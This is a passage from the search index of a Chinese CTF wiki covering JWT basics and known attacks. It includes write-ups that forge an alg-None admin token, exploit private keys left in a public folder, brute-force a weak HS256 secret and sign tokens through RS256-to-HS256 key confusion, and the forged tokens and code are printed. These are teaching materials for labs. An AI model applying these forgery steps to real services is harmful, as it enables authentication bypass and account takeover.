2.\u4fee\u6539\u7b97\u6cd5\u4eceRS256\u5230HS256 3.\u4fe1\u606f\u6cc4\u6f0f \u5bc6\u94a5\u6cc4\u6f0f 4.\u7206\u7834\u5bc6\u94a5 \u5b58\u5728\u7684\u6f0f\u6d1e \u00b6 CVE-2015-9235 Alg\uff1a\u65e0\u653b\u51fb CVE-2016-5431\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb CVE-2018-0114\u5bc6\u94a5\u6ce8\u5165\u653b\u51fb \u5176\u4ed6\u5df2\u77e5\u653b\u51fb JWKS\u6b3a\u9a97 \u201ckid\u201d\u6ce8\u5c04 \u8de8\u670d\u52a1\u4e2d\u7ee7\u653b\u51fb \u5f31\u5bc6\u94a5 \u53c2\u8003\u6587\u7ae0 \u00b6 \u4ecehfctf\u5b66\u4e60JWT\u4f2a\u9020 JSON Web Token \u5165\u95e8\u6559\u7a0b","title":"JWT\u7b80\u8981\u4ecb\u7ecd"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#jwt","text":"","title":"JWT\u7b80\u8981\u4ecb\u7ecd"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#_1","text":"jwt(JSON Web Token)\u662f\u4e00\u4e32json\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u7531\u670d\u52a1\u7aef\u7528\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u4fe1\u606f\u7b7e\u540d\u6765\u4fdd\u8bc1\u5176\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u4f2a\u9020\u3002Token\u91cc\u53ef\u4ee5\u5305\u542b\u6240\u6709\u5fc5\u8981\u4fe1\u606f\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u5c31\u65e0\u9700\u4fdd\u5b58\u4efb\u4f55\u5173\u4e8e\u7528\u6237\u6216\u4f1a\u8bdd\u7684\u4fe1\u606f\uff0cJWT\u53ef\u7528\u4e8e\u8eab\u4efd\u8ba4\u8bc1\u3001\u4f1a\u8bdd\u72b6\u6001\u7ef4\u6301\u3001\u4fe1\u606f\u4ea4\u6362\u7b49\u3002\u5b83\u7684\u51fa\u73b0\u662f\u4e3a\u4e86\u5728\u7f51\u7edc\u5e94\u7528\u73af\u5883\u95f4\u4f20\u9012\u58f0\u660e\u800c\u6267\u884c\u7684\u4e00\u79cd\u57fa\u4e8eJSON\u7684\u5f00\u653e\u6807\u51c6\uff08 (RFC 7519 ).\u8be5token\u88ab\u8bbe\u8ba1\u4e3a\u7d27\u51d1\u4e14\u5b89\u5168\u7684\uff0c\u7279\u522b\u9002\u7528\u4e8e\u5206\u5e03\u5f0f\u7ad9\u70b9\u7684\u5355\u70b9\u767b\u5f55\uff08SSO\uff09\u573a\u666f\u3002 \u4e00\u4e2ajwt token\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff0cheader\u3001payload\u4e0esignature\uff0c\u4ee5\u70b9\u9694\u5f00\uff0c\u5f62\u5982 aaaa.bbbb.cccc \u3002 \u4e00\u4e2a\u5177\u4f53\u7684\u4f8b\u5b50\uff1a eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ header\u7528\u6765\u58f0\u660etoken\u7684\u7c7b\u578b\u548c\u7b7e\u540d\u7528\u7684\u7b97\u6cd5\u7b49\uff0c\u9700\u8981\u7ecf\u8fc7Base64Url\u7f16\u7801\u3002\u6bd4\u5982\u4ee5\u4e0atoken\u7684\u5934\u90e8\u7ecf\u8fc7base64\u89e3\u7801\u540e\u4e3a {\"alg\":\"HS256\",\"typ\":\"JWT\"} eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 \u89e3\u7801\u4e3a { \"alg\": \"HS256\", \"typ\": \"JWT\" } alg\u5c5e\u6027\u8868\u793a\u7b7e\u540d\u7684\u7b97\u6cd5\uff08algorithm\uff09\uff0c\u9ed8\u8ba4\u662f HMAC SHA256\uff08\u5199\u6210 HS256\uff09\uff1b typ\u5c5e\u6027\u8868\u793a\u8fd9\u4e2a\u4ee4\u724c\uff08token\uff09\u7684\u7c7b\u578b\uff08type\uff09\uff0cJWT \u4ee4\u724c\u7edf\u4e00\u5199\u4e3aJWT payload\u7528\u6765\u8868\u793a\u771f\u6b63\u7684token\u4fe1\u606f\uff0c\u4e5f\u9700\u8981\u7ecf\u8fc7Base64Url\u7f16\u7801\u3002\u6bd4\u5982\u4ee5\u4e0atoken\u7684payload\u7ecf\u8fc7\u89e3\u7801\u540e\u4e3a {\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022} eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ \u89e3\u7801\u4e3a { \"sub\": \"1234567890\", \"name\": \"John Doe\", \"iat\": 1516239022 } JWT \u89c4\u5b9a\u4e867\u4e2a\u5b98\u65b9\u5b57\u6bb5\uff0c\u4f9b\u9009\u7528 iss (issuer)\uff1a\u7b7e\u53d1\u4eba exp (expiration time)\uff1a\u8fc7\u671f\u65f6\u95f4 sub (subject)\uff1a\u4e3b\u9898 aud (audience)\uff1a\u53d7\u4f17 nbf (Not Before)\uff1a\u751f\u6548\u65f6\u95f4 iat (Issued At)\uff1a\u7b7e\u53d1\u65f6\u95f4 jti (JWT ID)\uff1a\u7f16\u53f7 signature\uff0c\u5c06\u524d\u4e24\u90e8\u5206\u7528 alg \u6307\u5b9a\u7684\u7b97\u6cd5\u52a0\u5bc6\uff0c\u518d\u7ecf\u8fc7Base64Url\u7f16\u7801\u5c31\u662fsignature\u4e86\uff0c\u4f5c\u7528\u662f\u9632\u6b62\u6570\u636e\u7be1\u6539\u3002","title":"\u4ecb\u7ecd"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#_2","text":"\u4e00\u822c\u63a8\u8350\u53bb http://jwt.io/ \u89e3\u7801\uff0c\u62ff\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50 \u89e3\u5bc6\u524d eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ \u89e3\u5bc6\u540e { \"alg\": \"None\", \"typ\": \"jwt\" } [ { \"sub\": \"user\" } ]","title":"\u89e3\u7801"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#jwt_1","text":"1.\u4fee\u6539\u7b97\u6cd5\u4e3anone 2.\u4fee\u6539\u7b97\u6cd5\u4eceRS256\u5230HS256 3.\u4fe1\u606f\u6cc4\u6f0f \u5bc6\u94a5\u6cc4\u6f0f 4.\u7206\u7834\u5bc6\u94a5","title":"JWT\u7684\u5b89\u5168\u95ee\u9898"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#_3","text":"CVE-2015-9235 Alg\uff1a\u65e0\u653b\u51fb CVE-2016-5431\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb CVE-2018-0114\u5bc6\u94a5\u6ce8\u5165\u653b\u51fb \u5176\u4ed6\u5df2\u77e5\u653b\u51fb JWKS\u6b3a\u9a97 \u201ckid\u201d\u6ce8\u5c04 \u8de8\u670d\u52a1\u4e2d\u7ee7\u653b\u51fb \u5f31\u5bc6\u94a5","title":"\u5b58\u5728\u7684\u6f0f\u6d1e"},{"location":"CTFWiki/Web/JWT/JWT\u7b80\u8981\u4ecb\u7ecd/#_4","text":"\u4ecehfctf\u5b66\u4e60JWT\u4f2a\u9020 JSON Web Token \u5165\u95e8\u6559\u7a0b","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"CTFWiki/Web/JWT/\u4e00\u4e2a\u7b80\u5355\u7684\u65e0\u52a0\u5bc6\u9898\u76ee/","text":"\u4e00\u4e2a\u7b80\u5355\u7684\u65e0\u52a0\u5bc6\u9898\u76ee \u00b6 \u9996\u5148\u6253\u5f00\u9898\u76ee,\u67e5\u770b\u6e90\u7801\uff0c\u63a5\u4e0b\u6765\u8bbf\u95ee/admin\u88ab\u8df3\u8f6c\u56de\u4e3b\u9875\u5565\u4e5f\u6ca1\u6709\u53d1\u751f where is flag? <!-- /admin --> \u5f53\u7136\u77e5\u9053\u8fd9\u4e2a\u677f\u5757\u662fJWT\uff0c\u81ea\u7136\u800c\u7136\u6211\u4eec\u770b\u4e00\u773cCookie\uff0c\u53d1\u73b0\u540d\u4e3aauth\u7684\u4e00\u4e2acookie\u4e3a eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ \u901a\u8fc7base64\u89e3\u5bc6\u6216\u8005\u53bbjwt.io\u89e3\u7801\u4e5f\u884c\uff0c\u5f97\u5230\u7ed3\u679c {\"alg\":\"None\",\"typ\":\"jwt\"}[{\"sub\":\"user\"}] \u6240\u4ee5\u6211\u4eec\u5c1d\u8bd5\u628asub\u5bf9\u5e94\u7684\u952e\u503c\u4fee\u6539 {\"alg\":\"None\",\"typ\":\"jwt\"}[{\"sub\":\"admin\"}] \u628a\u524d\u9762\u90e8\u5206\u548c\u540e\u9762\u90e8\u5206\u5206\u522bbase64-encode eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 \u540e\u9762 W3sic3ViIjoiYWRtaW4ifV0= \u628a\u8fd9\u4e24\u90e8\u5206\u7528\u70b9(.)\u62fc\u63a5\u4e24\u90e8\u5206\u5e76\u53bb\u6389\u7b49\u4e8e\u53f7 eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0 \u6b64\u65f6\u62ff\u7740\u8fd9\u4e00\u4e32cookie\u53bb\u66ff\u6362\u6389\u539f\u6765\u7684\u503c\uff0c\u4e4b\u540e\u8bbf\u95ee /admin \u5373\u53ef\u83b7\u53d6flag","title":"\u4e00\u4e2a\u7b80\u5355\u7684\u65e0\u52a0\u5bc6\u9898\u76ee"},{"location":"CTFWiki/Web/JWT/\u4e00\u4e2a\u7b80\u5355\u7684\u65e0\u52a0\u5bc6\u9898\u76ee/#_1","text":"\u9996\u5148\u6253\u5f00\u9898\u76ee,\u67e5\u770b\u6e90\u7801\uff0c\u63a5\u4e0b\u6765\u8bbf\u95ee/admin\u88ab\u8df3\u8f6c\u56de\u4e3b\u9875\u5565\u4e5f\u6ca1\u6709\u53d1\u751f where is flag? <!-- /admin --> \u5f53\u7136\u77e5\u9053\u8fd9\u4e2a\u677f\u5757\u662fJWT\uff0c\u81ea\u7136\u800c\u7136\u6211\u4eec\u770b\u4e00\u773cCookie\uff0c\u53d1\u73b0\u540d\u4e3aauth\u7684\u4e00\u4e2acookie\u4e3a eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoidXNlciJ9XQ \u901a\u8fc7base64\u89e3\u5bc6\u6216\u8005\u53bbjwt.io\u89e3\u7801\u4e5f\u884c\uff0c\u5f97\u5230\u7ed3\u679c {\"alg\":\"None\",\"typ\":\"jwt\"}[{\"sub\":\"user\"}] \u6240\u4ee5\u6211\u4eec\u5c1d\u8bd5\u628asub\u5bf9\u5e94\u7684\u952e\u503c\u4fee\u6539 {\"alg\":\"None\",\"typ\":\"jwt\"}[{\"sub\":\"admin\"}] \u628a\u524d\u9762\u90e8\u5206\u548c\u540e\u9762\u90e8\u5206\u5206\u522bbase64-encode eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 \u540e\u9762 W3sic3ViIjoiYWRtaW4ifV0= \u628a\u8fd9\u4e24\u90e8\u5206\u7528\u70b9(.)\u62fc\u63a5\u4e24\u90e8\u5206\u5e76\u53bb\u6389\u7b49\u4e8e\u53f7 eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0 \u6b64\u65f6\u62ff\u7740\u8fd9\u4e00\u4e32cookie\u53bb\u66ff\u6362\u6389\u539f\u6765\u7684\u503c\uff0c\u4e4b\u540e\u8bbf\u95ee /admin \u5373\u53ef\u83b7\u53d6flag","title":"\u4e00\u4e2a\u7b80\u5355\u7684\u65e0\u52a0\u5bc6\u9898\u76ee"},{"location":"CTFWiki/Web/JWT/\u516c\u79c1\u94a5\u6cc4\u9732/","text":"\u516c\u79c1\u94a5\u6cc4\u9732 \u00b6 \u9996\u5148\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u516c\u79c1\u94a5\u90fd\u653e\u5728\u4e86public\u6587\u4ef6\u5939\u4e0b\u9762\uff0cnodejs\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u6b64\u6587\u4ef6 /* GET home page. */ router.get('/', function(req, res, next) { res.type('html'); var privateKey = fs.readFileSync(process.cwd()+'//public//private.key'); var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' }); res.cookie('auth',token); res.end('where is flag?'); }); router.post('/',function(req,res,next){ var flag=\"flag_here\"; res.type('html'); var auth = req.cookies.auth; var cert = fs.readFileSync(process.cwd()+'//public/public.key'); // get public key jwt.verify(auth, cert, function(err, decoded) { if(decoded.user==='admin'){ res.end(flag); }else{ res.end('you are not admin'); } }); }); \u56e0\u6b64\u6211\u4eec\u5728url\u540e\u9762\u5206\u522b\u62fc\u63a5private.key\u4e0epublic.key\u5c06\u516c\u79c1\u94a5\u4e0b\u8f7d\u4e0b\u6765 \u7136\u540e\u6211\u4eec\u770b\u770b\u89e3\u7801\u7ed3\u679c { \"alg\": \"RS256\", \"typ\": \"JWT\" } { \"user\": \"user\", \"iat\": 1609250966 } \u53d1\u73b0\u679c\u7136\u662fRS256 RS256 (\u91c7\u7528SHA-256 \u7684 RSA \u7b7e\u540d) \u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u7b97\u6cd5, \u5b83\u4f7f\u7528\u516c\u5171/\u79c1\u94a5\u5bf9: \u6807\u8bc6\u63d0\u4f9b\u65b9\u91c7\u7528\u79c1\u94a5\u751f\u6210\u7b7e\u540d, JWT \u7684\u4f7f\u7528\u65b9\u83b7\u53d6\u516c\u94a5\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u3002\u7531\u4e8e\u516c\u94a5 (\u4e0e\u79c1\u94a5\u76f8\u6bd4) \u4e0d\u9700\u8981\u4fdd\u62a4, \u56e0\u6b64\u5927\u591a\u6570\u6807\u8bc6\u63d0\u4f9b\u65b9\u4f7f\u5176\u6613\u4e8e\u4f7f\u7528\u65b9\u83b7\u53d6\u548c\u4f7f\u7528 (\u901a\u5e38\u901a\u8fc7\u4e00\u4e2a\u5143\u6570\u636eURL)\u3002 \u5728jwt.io\u4e2d\u5206\u522b\u628a\u516c\u79c1\u94a5\u590d\u5236\u8fdb\u53bb\uff0c\u7136\u540e\u66ff\u6362Cookie\u5373\u53ef","title":"\u516c\u79c1\u94a5\u6cc4\u9732"},{"location":"CTFWiki/Web/JWT/\u516c\u79c1\u94a5\u6cc4\u9732/#_1","text":"\u9996\u5148\u770b\u4ee3\u7801\uff0c\u53d1\u73b0\u516c\u79c1\u94a5\u90fd\u653e\u5728\u4e86public\u6587\u4ef6\u5939\u4e0b\u9762\uff0cnodejs\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u6b64\u6587\u4ef6 /* GET home page. */ router.get('/', function(req, res, next) { res.type('html'); var privateKey = fs.readFileSync(process.cwd()+'//public//private.key'); var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' }); res.cookie('auth',token); res.end('where is flag?'); }); router.post('/',function(req,res,next){ var flag=\"flag_here\"; res.type('html'); var auth = req.cookies.auth; var cert = fs.readFileSync(process.cwd()+'//public/public.key'); // get public key jwt.verify(auth, cert, function(err, decoded) { if(decoded.user==='admin'){ res.end(flag); }else{ res.end('you are not admin'); } }); }); \u56e0\u6b64\u6211\u4eec\u5728url\u540e\u9762\u5206\u522b\u62fc\u63a5private.key\u4e0epublic.key\u5c06\u516c\u79c1\u94a5\u4e0b\u8f7d\u4e0b\u6765 \u7136\u540e\u6211\u4eec\u770b\u770b\u89e3\u7801\u7ed3\u679c { \"alg\": \"RS256\", \"typ\": \"JWT\" } { \"user\": \"user\", \"iat\": 1609250966 } \u53d1\u73b0\u679c\u7136\u662fRS256 RS256 (\u91c7\u7528SHA-256 \u7684 RSA \u7b7e\u540d) \u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u7b97\u6cd5, \u5b83\u4f7f\u7528\u516c\u5171/\u79c1\u94a5\u5bf9: \u6807\u8bc6\u63d0\u4f9b\u65b9\u91c7\u7528\u79c1\u94a5\u751f\u6210\u7b7e\u540d, JWT \u7684\u4f7f\u7528\u65b9\u83b7\u53d6\u516c\u94a5\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u3002\u7531\u4e8e\u516c\u94a5 (\u4e0e\u79c1\u94a5\u76f8\u6bd4) \u4e0d\u9700\u8981\u4fdd\u62a4, \u56e0\u6b64\u5927\u591a\u6570\u6807\u8bc6\u63d0\u4f9b\u65b9\u4f7f\u5176\u6613\u4e8e\u4f7f\u7528\u65b9\u83b7\u53d6\u548c\u4f7f\u7528 (\u901a\u5e38\u901a\u8fc7\u4e00\u4e2a\u5143\u6570\u636eURL)\u3002 \u5728jwt.io\u4e2d\u5206\u522b\u628a\u516c\u79c1\u94a5\u590d\u5236\u8fdb\u53bb\uff0c\u7136\u540e\u66ff\u6362Cookie\u5373\u53ef","title":"\u516c\u79c1\u94a5\u6cc4\u9732"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u5f31\u53e3\u4ee4/","text":"\u5bc6\u94a5\u5f31\u53e3\u4ee4 \u00b6 \u5982\u679c\u6211\u4eec\u9700\u8981\u5bc6\u94a5\u7206\u7834\u63a8\u8350\u51e0\u4e2a\u5de5\u5177 \u5de5\u5177:(\u4e00\u822c\u7b2c\u4e00\u4e2a\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u5176\u4ed6\u6211\u4e5f\u6ca1\u7528\u8fc7) c-jwt-cracker Hashcat john \u770b\u89c1\u9898\u5e72\u8bf4\u662f\u5f31\u53e3\u4ee4\uff0c\u53bbjwt.io\u89e3\u7801 \u89e3\u7801\u524d eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNzM2NiwiZXhwIjoxNjA5MjQ0NTY2LCJuYmYiOjE2MDkyMzczNjYsInN1YiI6InVzZXIiLCJqdGkiOiI3NzgzMjYzZDIxODVlYzhlYTBhYjY2MjZmMTk5MWRiOCJ9.aX8kzpC_p6HCUW60UdLVqjkDN97zmP0Ce6yETdaiv80 \u89e3\u7801\u540e\u53d1\u73b0\u8fd8\u662fHS256\u5bf9\u79f0\u52a0\u5bc6 { \"alg\": \"HS256\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1609237366, \"exp\": 1609244566, \"nbf\": 1609237366, \"sub\": \"user\", \"jti\": \"7783263d2185ec8ea0ab6626f1991db8\" } \u65e2\u7136\u9898\u76ee\u8bf4\u662f\u5f31\u53e3\u4ee4\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u6700\u7b80\u5355\u7684\u5f31\u53e3\u4ee4123456,\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ea\u9700\u8981\u62ff\u7740\u8fd9\u4e2a\u5bc6\u94a5\u53bb\u751f\u6210jwt\u5373\u53ef","title":"\u5bc6\u94a5\u5f31\u53e3\u4ee4"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u5f31\u53e3\u4ee4/#_1","text":"\u5982\u679c\u6211\u4eec\u9700\u8981\u5bc6\u94a5\u7206\u7834\u63a8\u8350\u51e0\u4e2a\u5de5\u5177 \u5de5\u5177:(\u4e00\u822c\u7b2c\u4e00\u4e2a\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u5176\u4ed6\u6211\u4e5f\u6ca1\u7528\u8fc7) c-jwt-cracker Hashcat john \u770b\u89c1\u9898\u5e72\u8bf4\u662f\u5f31\u53e3\u4ee4\uff0c\u53bbjwt.io\u89e3\u7801 \u89e3\u7801\u524d eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYwOTIzNzM2NiwiZXhwIjoxNjA5MjQ0NTY2LCJuYmYiOjE2MDkyMzczNjYsInN1YiI6InVzZXIiLCJqdGkiOiI3NzgzMjYzZDIxODVlYzhlYTBhYjY2MjZmMTk5MWRiOCJ9.aX8kzpC_p6HCUW60UdLVqjkDN97zmP0Ce6yETdaiv80 \u89e3\u7801\u540e\u53d1\u73b0\u8fd8\u662fHS256\u5bf9\u79f0\u52a0\u5bc6 { \"alg\": \"HS256\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1609237366, \"exp\": 1609244566, \"nbf\": 1609237366, \"sub\": \"user\", \"jti\": \"7783263d2185ec8ea0ab6626f1991db8\" } \u65e2\u7136\u9898\u76ee\u8bf4\u662f\u5f31\u53e3\u4ee4\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u6700\u7b80\u5355\u7684\u5f31\u53e3\u4ee4123456,\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ea\u9700\u8981\u62ff\u7740\u8fd9\u4e2a\u5bc6\u94a5\u53bb\u751f\u6210jwt\u5373\u53ef","title":"\u5bc6\u94a5\u5f31\u53e3\u4ee4"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/","text":"\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb \u00b6 \u524d\u8a00 \u00b6 JWT\u7b7e\u540d\u7b97\u6cd5\u4e2d\uff0c\u4e00\u822c\u6709\u4e24\u4e2a\u9009\u62e9\uff0c\u4e00\u4e2a\u91c7\u7528HS256,\u53e6\u5916\u4e00\u4e2a\u5c31\u662f\u91c7\u7528RS256\u3002 \u7b7e\u540d\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u8fc7\u7a0b\uff0c\u751f\u6210\u4e00\u6bb5\u6807\u8bc6\uff08\u4e5f\u662fJWT\u7684\u4e00\u90e8\u5206\uff09\u4f5c\u4e3a\u63a5\u6536\u65b9\u9a8c\u8bc1\u4fe1\u606f\u662f\u5426\u88ab\u7be1\u6539\u7684\u4f9d\u636e\u3002 RS256 (\u91c7\u7528SHA-256 \u7684 RSA \u7b7e\u540d) \u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u7b97\u6cd5, \u5b83\u4f7f\u7528\u516c\u5171/\u79c1\u94a5\u5bf9: \u6807\u8bc6\u63d0\u4f9b\u65b9\u91c7\u7528\u79c1\u94a5\u751f\u6210\u7b7e\u540d, JWT \u7684\u4f7f\u7528\u65b9\u83b7\u53d6\u516c\u94a5\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u3002\u7531\u4e8e\u516c\u94a5 (\u4e0e\u79c1\u94a5\u76f8\u6bd4) \u4e0d\u9700\u8981\u4fdd\u62a4, \u56e0\u6b64\u5927\u591a\u6570\u6807\u8bc6\u63d0\u4f9b\u65b9\u4f7f\u5176\u6613\u4e8e\u4f7f\u7528\u65b9\u83b7\u53d6\u548c\u4f7f\u7528 (\u901a\u5e38\u901a\u8fc7\u4e00\u4e2a\u5143\u6570\u636eURL)\u3002 \u53e6\u4e00\u65b9\u9762, HS256 (\u5e26\u6709 SHA-256 \u7684 HMAC \u662f\u4e00\u79cd\u5bf9\u79f0\u7b97\u6cd5, \u53cc\u65b9\u4e4b\u95f4\u4ec5\u5171\u4eab\u4e00\u4e2a \u5bc6\u94a5\u3002\u7531\u4e8e\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u751f\u6210\u7b7e\u540d\u548c\u9a8c\u8bc1\u7b7e\u540d, \u56e0\u6b64\u5fc5\u987b\u6ce8\u610f\u786e\u4fdd\u5bc6\u94a5\u4e0d\u88ab\u6cc4\u5bc6\u3002 \u5728\u5f00\u53d1\u5e94\u7528\u7684\u65f6\u5019\u542f\u7528JWT\uff0c\u4f7f\u7528RS256\u66f4\u52a0\u5b89\u5168\uff0c\u4f60\u53ef\u4ee5\u63a7\u5236\u8c01\u80fd\u4f7f\u7528\u4ec0\u4e48\u7c7b\u578b\u7684\u5bc6\u94a5\u3002\u53e6\u5916\uff0c\u5982\u679c\u4f60\u65e0\u6cd5\u63a7\u5236\u5ba2\u6237\u7aef\uff0c\u65e0\u6cd5\u505a\u5230\u5bc6\u94a5\u7684\u5b8c\u5168\u4fdd\u5bc6\uff0cRS256\u4f1a\u662f\u4e2a\u66f4\u4f73\u7684\u9009\u62e9\uff0cJWT\u7684\u4f7f\u7528\u65b9\u53ea\u9700\u8981\u77e5\u9053\u516c\u94a5\u3002 \u7531\u4e8e\u516c\u94a5\u901a\u5e38\u53ef\u4ee5\u4ece\u5143\u6570\u636eURL\u8282\u70b9\u83b7\u5f97\uff0c\u56e0\u6b64\u53ef\u4ee5\u5bf9\u5ba2\u6237\u7aef\u8fdb\u884c\u8fdb\u884c\u7f16\u7a0b\u4ee5\u81ea\u52a8\u68c0\u7d22\u516c\u94a5\u3002\u5982\u679c\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4ece\u670d\u52a1\u5668\u4e0a\u76f4\u63a5\u4e0b\u8f7d\u516c\u94a5\u4fe1\u606f\uff0c\u53ef\u4ee5\u6709\u6548\u7684\u51cf\u5c11\u914d\u7f6e\u4fe1\u606f\u3002 \u5229\u7528 \u00b6 \u6b64\u653b\u51fb\u7684\u539f\u56e0\u662f\u67d0\u4e9b\u5e93\u5bf9\u7b7e\u540d/\u9a8c\u8bc1HMAC\u5bf9\u79f0\u52a0\u5bc6\u7684\u5bc6\u94a5\u548c\u5305\u542b\u7528\u4e8e\u9a8c\u8bc1RSA\u7b7e\u540d\u4ee4\u724c\u7684\u516c\u94a5\u7684\u5bc6\u94a5\u4f7f\u7528\u76f8\u540c\u7684\u53d8\u91cf\u540d\u3002 \u901a\u8fc7\u5c06\u7b97\u6cd5\u8c03\u6574\u4e3aHMAC\u53d8\u4f53\uff08HS256/HS384/HS512\uff09\u5e76\u4f7f\u7528\u516c\u5171\u53ef\u7528\u516c\u94a5\u5bf9\u5176\u8fdb\u884c\u7b7e\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u6b3a\u9a97\u670d\u52a1\u4f7f\u7528\u673a\u5bc6\u53d8\u91cf\u4e2d\u7684\u786c\u7f16\u7801\u516c\u94a5\u9a8c\u8bc1HMAC\u4ee4\u724c\u3002 WP \u00b6 \u7531\u4e8ejwt\u5728python\u548cnodejs\u7684\u5e93\u4e0d\u540c\uff0c\u9020\u6210\u5728\u8fd9\u91cc\u53ea\u80fd\u81ea\u5df1\u624b\u52a8\u751f\u6210\u4e86,\u4e4b\u540e\u8fd0\u884cnodejs\u83b7\u53d6cookie\u53bb\u66ff\u6362\u5373\u53ef router . get ( '/' , function ( req , res , next ) { res . type ( 'html' ); var cert = fs . readFileSync ( process . cwd () + '//routes/public.key' ); var token = jwt . sign ({ user : 'admin' }, cert , { algorithm : 'HS256' }); res . cookie ( 'auth' , token ); res . end ( 'where is flag?' ); }); \u5982\u4f55\u9632\u5fa1 \u00b6 JWT\u914d\u7f6e\u5e94\u8be5\u53ea\u5141\u8bb8\u4f7f\u7528HMAC\u7b97\u6cd5\u6216\u516c\u94a5\u7b97\u6cd5\uff0c\u51b3\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528\u8fd9\u4e24\u79cd\u7b97\u6cd5","title":"\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/#_1","text":"","title":"\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb"},{"location":"CTFWiki/Web/JWT/\u5bc6\u94a5\u6df7\u6dc6\u653b\u51fb/#_2","text":"JWT\u7b7e\u540d\u7b97\u6cd5\u4e2d\uff0c\u4e00\u822c\u6709\u4e24\u4e2a\u9009\u62e9\uff0c\u4e00\u4e2a\u91c7\u7528HS256,\u53e6\u5916\u4e00\u4e2a\u5c31\u662f\u91c7\u7528RS256\u3002 \u7b7e\u540d\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u8fc7\u7a0b\uff0c\u751f\u6210\u4e00\u6bb5\u6807\u8bc6\uff08\u4e5f\u662fJWT\u7684\u4e00\u90e8\u5206\uff09\u4f5c\u4e3a\u63a5\u6536\u65b9\u9a8c\u8bc1\u4fe1\u606f\u662f\u5426\u88ab\u7be1\u6539\u7684\u4f9d\u636e\u3002 RS256 (\u91c7\u7528SHA-256 \u7684 RSA \u7b7e\u540d) \u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u7b97\u6cd5, \u5b83\u4f7f\u7528\u516c\u5171/\u79c1\u94a5\u5bf9: \u6807\u8bc6\u63d0\u4f9b\u65b9\u91c7\u7528\u79c1\u94a5\u751f\u6210\u7b7e\u540d, JWT \u7684\u4f7f\u7528\u65b9\u83b7\u53d6\u516c\u94a5\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u3002\u7531\u4e8e\u516c\u94a5 (\u4e0e\u79c1\u94a5\u76f8\u6bd4) \u4e0d\u9700\u8981\u4fdd\u62a4, \u56e0\u6b64\u5927\u591a\u6570\u6807\u8bc6\u63d0\u4f9b\u65b9\u4f7f\u5176\u6613\u4e8e\u4f7f\u7528\u65b9\u83b7\u53d6\u548c\u4f7f\u7528 (\u901a\u5e38\u901a\u8fc7\u4e00\u4e2a\u5143\u6570\u636eURL)\u3002 \u53e6\u4e00\u65b9\u9762, HS256 (\u5e26\u6709 SHA-256 \u7684 